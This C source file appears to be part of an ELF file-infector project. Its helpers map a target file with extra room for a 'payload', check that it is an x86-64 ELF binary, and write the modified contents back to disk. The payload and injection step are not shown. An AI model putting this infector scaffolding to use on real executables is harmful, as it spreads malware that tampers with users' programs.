#include "famine.h"

int  mapFile(const char *dirname, const char *filename, struct bfile *file) {
  int         fd;
  char        *tmp;
  struct stat stats;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  if (fstat(fd, &stats) == -1) {
    close(fd);
    return (-1);
  }
  file->size = stats.st_size;
  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  close(fd);
  return (0);
}

int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

int  writeToFile(const char *dirname, const char *filename, struct bfile header) {
  int   fd;
  char  *tmp;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_WRONLY)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  write(fd, header.header, header.size);
  close(fd);
  return (0);
}
